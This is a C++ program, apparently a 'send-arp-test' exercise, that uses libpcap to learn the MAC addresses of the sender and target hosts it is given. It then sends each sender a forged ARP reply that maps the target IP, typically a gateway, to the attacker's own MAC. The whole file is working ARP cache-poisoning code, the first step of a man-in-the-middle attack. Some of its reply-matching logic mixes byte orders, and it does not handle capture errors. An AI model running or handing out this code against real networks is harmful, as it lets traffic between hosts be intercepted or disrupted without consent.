#include <cstdio>
#include <pcap.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2 == 1 && argc >= 4)) {
        printf("send-arp-test <interface> <sender IP> <target IP> ...\n");
        printf("send-arp-test wlan0 172.30.1.97 172.30.1.254\n");
        return EXIT_FAILURE;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        return EXIT_FAILURE;
    }

    uint8_t my_mac[6] = {0}, sender_mac[6] = {0}, target_mac[6] = {0};
    char my_ip[INET_ADDRSTRLEN] = {0};

    // Get network information (IP and MAC address)
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1) {
        return EXIT_FAILURE;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL || !(ifa->ifa_flags & IFF_UP)) continue;

        if (strcmp(ifa->ifa_name, dev) == 0) {
            if (ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
                inet_ntop(AF_INET, &addr->sin_addr, my_ip, INET_ADDRSTRLEN);
            }
            if (ifa->ifa_addr->sa_family == AF_PACKET) {
                struct sockaddr_ll *s = (struct sockaddr_ll *)ifa->ifa_addr;
                memcpy(my_mac, s->sll_addr, 6);
            }
        }
    }
    freeifaddrs(ifaddr);

    uint8_t eth_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t arp_empty_mac[6] = {0};

    for (int i = 2; i < argc; i += 2) {
        char* sender_ip = argv[i];
        char* target_ip = argv[i + 1];

        EthArpPacket req_sender;
        req_sender.eth_.dmac_ = Mac(eth_bcast);
        req_sender.eth_.smac_ = Mac(my_mac);
        req_sender.eth_.type_ = htons(EthHdr::Arp);

        req_sender.arp_.hrd_ = htons(ArpHdr::ETHER);
        req_sender.arp_.pro_ = htons(EthHdr::Ip4);
        req_sender.arp_.hln_ = Mac::Size;
        req_sender.arp_.pln_ = Ip::Size;
        req_sender.arp_.op_ = htons(ArpHdr::Request);
        req_sender.arp_.smac_ = Mac(my_mac);
        req_sender.arp_.sip_ = htonl(Ip(my_ip));
        req_sender.arp_.tmac_ = Mac(arp_empty_mac);
        req_sender.arp_.tip_ = htonl(Ip(sender_ip));

        pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&req_sender), sizeof(EthArpPacket));

        while (true) {
            struct pcap_pkthdr *header;
            const u_char *recv_packet;

            int res = pcap_next_ex(pcap, &header, &recv_packet);
            if (res == 0) continue;

            struct EthHdr* eth = (struct EthHdr*)recv_packet;
            if (ntohs(eth->type_) != 0x0806) continue;  // ARP check

            struct ArpHdr* arp = (struct ArpHdr*)(recv_packet + sizeof(struct EthHdr));
            if (ntohs(arp->op_) != 2) continue;  // ARP reply check

            if (ntohl(arp->tip_) == htonl((uint32_t)inet_addr(my_ip))) {
                if (ntohl(arp->sip_) == htonl((uint32_t)inet_addr(sender_ip))) {
                    memcpy(sender_mac, (uint8_t*)arp->smac_, ETHER_ADDR_LEN);
                    break;
                }
            }
        }

        EthArpPacket req_target;
        req_target.eth_.dmac_ = Mac(eth_bcast);
        req_target.eth_.smac_ = Mac(my_mac);
        req_target.eth_.type_ = htons(EthHdr::Arp);

        req_target.arp_.hrd_ = htons(ArpHdr::ETHER);
        req_target.arp_.pro_ = htons(EthHdr::Ip4);
        req_target.arp_.hln_ = Mac::Size;
        req_target.arp_.pln_ = Ip::Size;
        req_target.arp_.op_ = htons(ArpHdr::Request);
        req_target.arp_.smac_ = Mac(my_mac);
        req_target.arp_.sip_ = htonl(Ip(my_ip));
        req_target.arp_.tmac_ = Mac(arp_empty_mac);
        req_target.arp_.tip_ = htonl(Ip(target_ip));

        pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&req_target), sizeof(EthArpPacket));

        while (true) {
            struct pcap_pkthdr *header;
            const u_char *recv_packet;

            int res = pcap_next_ex(pcap, &header, &recv_packet);
            if (res == 0) continue;

            struct EthHdr* eth = (struct EthHdr*)recv_packet;
            if (ntohs(eth->type_) != 0x0806) continue;  // ARP check

            struct ArpHdr* arp = (struct ArpHdr*)(recv_packet + sizeof(struct EthHdr));
            if (ntohs(arp->op_) != 2) continue;  // ARP reply check

            if (ntohl(arp->tip_) == htonl((uint32_t)inet_addr(my_ip))) {
                if (ntohl(arp->sip_) == htonl((uint32_t)inet_addr(target_ip))) {
                    memcpy(target_mac, (uint8_t*)arp->smac_, ETHER_ADDR_LEN);
                    break;
                }
            }
        }

        EthArpPacket reply;
        reply.eth_.dmac_ = Mac(sender_mac);
        reply.eth_.smac_ = Mac(my_mac);
        reply.eth_.type_ = htons(EthHdr::Arp);

        reply.arp_.hrd_ = htons(ArpHdr::ETHER);
        reply.arp_.pro_ = htons(EthHdr::Ip4);
        reply.arp_.hln_ = Mac::Size;
        reply.arp_.pln_ = Ip::Size;
        reply.arp_.op_ = htons(ArpHdr::Reply);
        reply.arp_.smac_ = Mac(my_mac);
        reply.arp_.sip_ = htonl(Ip(target_ip));
        reply.arp_.tmac_ = Mac(sender_mac);
        reply.arp_.tip_ = htonl(Ip(sender_ip));

        pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&reply), sizeof(EthArpPacket));
    }

    pcap_close(pcap);
    return 0;
}
